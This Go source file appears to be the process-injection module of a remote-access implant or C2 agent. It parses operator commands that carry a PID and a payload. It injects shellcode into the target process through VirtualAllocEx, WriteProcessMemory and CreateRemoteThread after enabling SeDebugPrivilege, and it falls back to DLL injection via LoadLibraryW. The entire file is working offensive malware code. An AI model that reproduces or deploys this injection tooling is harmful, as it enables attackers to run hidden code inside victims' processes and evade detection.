package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procVirtualProtectEx  = kernel32.NewProc("VirtualProtectEx")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle       = kernel32.NewProc("CloseHandle")
)

const (
	PAGE_EXECUTE_READ      = 0x00000020
	PROCESS_CREATE_THREAD  = 0x0002
	PROCESS_VM_OPERATION   = 0x0008
	PROCESS_VM_WRITE       = 0x0020
	PROCESS_SUSPEND_RESUME = 0x0800
	INFINITE               = 0xFFFFFFFF
)

// InjectShellcode injects shellcode into a target process by PID
// cmdBuf format: pid(4) | shellcodeLen(4) | shellcode
func InjectShellcode(cmdBuf []byte) ([]byte, error) {
	if len(cmdBuf) < 8 {
		return nil, fmt.Errorf("injection data too short")
	}

	pid := binary.LittleEndian.Uint32(cmdBuf[:4])
	shellcodeLen := binary.LittleEndian.Uint32(cmdBuf[4:8])
	if uint32(len(cmdBuf)) < 8+shellcodeLen {
		return nil, fmt.Errorf("shellcode truncated")
	}
	shellcode := cmdBuf[8 : 8+shellcodeLen]

	return injectIntoProcess(pid, shellcode)
}

// InjectProcess handles the PROCESS_INJECT command
// cmdBuf format: pid(4) | dataLen(4) | data
func InjectProcess(cmdBuf []byte) ([]byte, error) {
	if len(cmdBuf) < 8 {
		return nil, fmt.Errorf("injection data too short")
	}

	pid := binary.LittleEndian.Uint32(cmdBuf[:4])
	dataLen := binary.LittleEndian.Uint32(cmdBuf[4:8])
	if uint32(len(cmdBuf)) < 8+dataLen {
		return nil, fmt.Errorf("data truncated")
	}
	data := cmdBuf[8 : 8+dataLen]

	// First try shellcode injection
	result, err := injectIntoProcess(pid, data)
	if err == nil {
		return result, nil
	}

	// Fallback: try DLL injection
	return injectDLL(pid, data)
}

func injectIntoProcess(pid uint32, shellcode []byte) ([]byte, error) {
	err := enablePrivilege("SeDebugPrivilege")
	if err != nil {
		return nil, fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	access := PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | windows.PROCESS_QUERY_INFORMATION
	hProcess, err := windows.OpenProcess(uint32(access), false, pid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	remoteAddr, _, _ := procVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if remoteAddr == 0 {
		return nil, fmt.Errorf("VirtualAllocEx failed")
	}

	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		uintptr(hProcess), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if ret == 0 || int(written) != len(shellcode) {
		return nil, fmt.Errorf("WriteProcessMemory failed")
	}

	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(hProcess), remoteAddr, uintptr(len(shellcode)),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	threadHandle, _, _ := procCreateRemoteThread.Call(
		uintptr(hProcess), 0, 0, remoteAddr, 0, 0, 0)
	if threadHandle == 0 {
		return nil, fmt.Errorf("CreateRemoteThread failed")
	}

	procWaitForSingleObject.Call(threadHandle, 5000)
	procCloseHandle.Call(threadHandle)

	return []byte(fmt.Sprintf("[+] Shellcode injected into PID %d (%d bytes)", pid, len(shellcode))), nil
}

func injectDLL(pid uint32, dllBytes []byte) ([]byte, error) {
	err := enablePrivilege("SeDebugPrivilege")
	if err != nil {
		return nil, fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	access := PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | windows.PROCESS_QUERY_INFORMATION
	hProcess, err := windows.OpenProcess(uint32(access), false, pid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d) for DLL: %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	dllPath := string(dllBytes)
	dllPathBytes := append([]byte(dllPath), 0)

	remoteAddr, _, _ := procVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(len(dllPathBytes)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if remoteAddr == 0 {
		return nil, fmt.Errorf("VirtualAllocEx for DLL path failed")
	}

	var written uintptr
	procWriteProcessMemory.Call(
		uintptr(hProcess), remoteAddr,
		uintptr(unsafe.Pointer(&dllPathBytes[0])),
		uintptr(len(dllPathBytes)),
		uintptr(unsafe.Pointer(&written)))

	loadLibAddr := kernel32.NewProc("LoadLibraryW").Addr()
	if loadLibAddr == 0 {
		return nil, fmt.Errorf("GetProcAddress(LoadLibraryW) failed")
	}

	threadHandle, _, _ := procCreateRemoteThread.Call(
		uintptr(hProcess), 0, 0, loadLibAddr, remoteAddr, 0, 0)
	if threadHandle == 0 {
		return nil, fmt.Errorf("CreateRemoteThread for DLL failed")
	}
	procWaitForSingleObject.Call(threadHandle, 10000)
	procCloseHandle.Call(threadHandle)

	return []byte(fmt.Sprintf("[+] DLL loaded into PID %d: %s", pid, dllPath)), nil
}

// ListProcesses (also defined in getsystem) - re-export for inject
func InjectProcessList() ([]byte, error) {
	return ListProcesses()
}

func init() {
	var _ = binary.LittleEndian
	var _ = bytes.MinRead
}
